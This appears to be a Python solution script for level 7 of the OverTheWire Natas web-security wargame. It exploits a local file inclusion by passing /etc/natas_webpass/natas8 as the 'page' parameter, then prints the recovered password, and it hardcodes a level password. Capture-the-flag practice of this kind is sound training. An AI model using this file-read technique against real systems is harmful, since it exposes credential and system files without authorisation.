import requests
import re

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = 'http://{}.natas.labs.overthewire.org'.format(username)
url += '/index.php?page=/etc/natas_webpass/natas8'
r = requests.get(url, auth=(username, password))

content = r.text


print("\n\nthe password for next level = ", re.findall("<br>\n<br>\n(.*)", content)[0])